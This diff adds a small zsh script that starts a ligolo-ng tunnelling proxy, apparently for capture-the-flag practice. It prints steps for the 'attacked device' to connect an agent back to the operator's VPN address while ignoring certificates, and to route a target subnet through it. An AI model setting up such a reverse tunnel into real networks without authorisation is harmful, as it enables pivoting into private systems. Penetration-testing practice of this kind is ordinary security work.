@@ -1,0 +1,12 @@
+#!/bin/zsh -i
+# ligolo proxy 
+# -selfcert and -ignore-cert are for ctf
+need ligolo-ng
+if [[ -z "$1" ]]; then
+  echo -e "Ip with subnet-> "
+  read net
+else
+  net=$1
+fi
+echo -e "Now in the attacked device do -> agent -connect $(vpn-ip):11601 -ignore-cert\ninterface_create --name "evil-cha"\ninterface_add_route --name evil-cha --route $net\nafter session connect you can do session to list and after start"
+\ligolo-ng-proxy -selfcert
